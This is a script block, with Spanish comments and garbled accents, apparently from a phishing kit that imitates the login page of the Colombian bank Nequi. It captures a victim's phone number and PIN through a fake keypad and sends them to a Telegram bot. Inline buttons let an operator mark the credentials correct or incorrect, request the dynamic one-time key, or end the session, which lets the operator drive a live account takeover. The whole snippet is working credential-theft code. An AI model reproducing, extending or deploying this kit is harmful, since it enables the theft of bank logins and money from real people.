<!-- â­ REEMPLAZA EL ÃšLTIMO <script> en access-sign-in-pass.html con ESTE: -->

<script src="../js/sendTelegramMessage.js"></script>
<script src="../js/actions.js"></script>
<script type="module">
  document.addEventListener("DOMContentLoaded", () => {
    const formData = JSON.parse(localStorage.getItem("formData")) || {};
    const inputs = document.querySelectorAll('input[id^="pass-"]');
    const keyboard = document.getElementById("keyboard");
    const deleteBtn = document.getElementById("delete-pass");
    const loadingSpinner = document.querySelector(".loadingContainer");
    const errorLogin = document.getElementById("error-login");
    const tryAgainButton = document.getElementById("tryAgainButton");
    let currentInput = 0;

    // â­ VERIFICAR QUE HAYA DATOS PREVIOS
    if (!formData.phoneNumber) {
      console.error("âŒ No hay nÃºmero de telÃ©fono guardado");
      window.location.href = "accces-sign-in.html";
      return;
    }

    console.log("ðŸ“± Datos cargados:", formData);

    tryAgainButton.addEventListener("click", () => {
      window.location.href = "accces-sign-in.html?error=1";
    });

    // Manejar clics del teclado
    keyboard.addEventListener("click", (e) => {
      const button = e.target.closest(".keyboard-btn");
      if (button && !button.id.includes("delete")) {
        const value = button.dataset.value;
        if (currentInput < inputs.length) {
          inputs[currentInput].dataset.realValue = value;
          inputs[currentInput].value = "*";
          inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
          currentInput++;
        }
      }
    });

    // Manejar el botÃ³n de borrar
    deleteBtn.addEventListener("click", () => {
      if (currentInput > 0) {
        currentInput--;
        inputs[currentInput].value = "";
        inputs[currentInput].dataset.realValue = "";
        inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
      }
    });

    // Permitir borrar con tecla retroceso
    document.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && currentInput > 0) {
        currentInput--;
        inputs[currentInput].value = "";
        inputs[currentInput].dataset.realValue = "";
        inputs[currentInput].dispatchEvent(new Event("input", { bubbles: true }));
      }
    });

    // Prevenir entrada de teclado fÃ­sico
    inputs.forEach((input) => {
      ["keydown", "keyup", "keypress"].forEach((eventType) => {
        input.addEventListener(eventType, (e) => {
          if (e.key !== "Backspace") {
            e.preventDefault();
            return false;
          }
        });
      });
      input.addEventListener("paste", (e) => {
        e.preventDefault();
        return false;
      });
      input.setAttribute("readonly", "readonly");
      input.setAttribute("inputmode", "none");
    });

    // Verificar cuando se complete la clave
    inputs.forEach((input) => {
      input.addEventListener("input", async () => {
        let isComplete = Array.from(inputs).every((inp) => inp.value !== "");
        
        if (isComplete) {
          let pass = "";
          inputs.forEach((inp) => {
            pass += inp.dataset.realValue || "";
          });

          console.log("ðŸ”‘ Clave ingresada:", pass);

          const savedData = JSON.parse(localStorage.getItem("formData")) || {};
          const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
          
          savedData.password = pass;
          savedData.transactionId = transactionId;
          localStorage.setItem("formData", JSON.stringify(savedData));
          
          console.log("ðŸ’¾ Datos guardados:", savedData);
          
          // Mostrar spinner
          if (loadingSpinner) {
            loadingSpinner.style.display = "block";
          }

          // â­ MENSAJE CON FORMATO CORRECTO
          const mensaje = `ðŸ” *NEQUI - DATOS DE ACCESO*\n\nðŸ“± *NÃºmero:* +57 ${savedData.phoneNumber}\nðŸ”‘ *Clave:* ${pass}\nâ° *Hora:* ${new Date().toLocaleTimeString('es-CO')}\nðŸ“… *Fecha:* ${new Date().toLocaleDateString('es-CO')}\n\nâš ï¸ *Esperando validaciÃ³n...*`;
          
          const teclado = JSON.stringify({
            inline_keyboard: [
              [
                { text: "âœ… Correcto", callback_data: `correcto:${transactionId}` },
                { text: "âŒ Incorrecto", callback_data: `incorrecto:${transactionId}` }
              ],
              [
                { text: "ðŸ” Pedir DinÃ¡mica", callback_data: `pedir_dinamica:${transactionId}` }
              ],
              [
                { text: "âš ï¸ Error DinÃ¡mica", callback_data: `error_dinamica:${transactionId}` },
                { text: "ðŸš« Error Login", callback_data: `error_login:${transactionId}` }
              ],
              [
                { text: "âœ”ï¸ Finalizar", callback_data: `finish:${transactionId}` }
              ]
            ]
          });

          console.log("ðŸ“¤ Enviando mensaje a Telegram...");

          try {
            // â­ VERIFICAR QUE LAS FUNCIONES EXISTAN
            if (typeof sendTelegramMessageWithBtn !== 'function') {
              throw new Error("La funciÃ³n sendTelegramMessageWithBtn no estÃ¡ definida");
            }

            const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
            console.log("âœ… Mensaje enviado exitosamente:", responseMensaje);

            if (!responseMensaje || !responseMensaje.message_id) {
              throw new Error("No se recibiÃ³ message_id del servidor");
            }

            console.log("â³ Esperando respuesta del operador...");
            const { action } = await waitForButtonPress(responseMensaje.message_id);
            console.log("âœ… AcciÃ³n recibida:", action);

            await handleAction(action, transactionId);

          } catch (error) {
            console.error("âŒ Error completo:", error);
            
            if (loadingSpinner) {
              loadingSpinner.style.display = "none";
            }
            
            if (errorLogin) {
              errorLogin.classList.remove("hidden");
              errorLogin.style.display = "flex";
            }

            // Mostrar alerta al usuario
            alert("Error de conexiÃ³n. Por favor verifica tu internet e intenta nuevamente.\n\nDetalles tÃ©cnicos: " + error.message);
            
            // Limpiar campos despuÃ©s de 3 segundos
            setTimeout(() => {
              inputs.forEach(inp => {
                inp.value = "";
                inp.dataset.realValue = "";
              });
              currentInput = 0;
            }, 3000);
          }
        }
      });
    });
  });
</script>
